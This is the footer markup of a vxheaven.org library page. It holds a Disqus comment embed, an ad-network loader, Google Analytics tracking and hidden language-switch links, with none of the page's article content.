        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>



</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vkj00">de</a><a href="/lib/index.php?lang=en&amp;id=vkj00">en</a><a href="/lib/index.php?lang=es&amp;id=vkj00">es</a><a href="/lib/index.php?lang=it&amp;id=vkj00">it</a><a href="/lib/index.php?lang=fr&amp;id=vkj00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vkj00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vkj00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vkj00">ua</a></div>
</body>
</html>
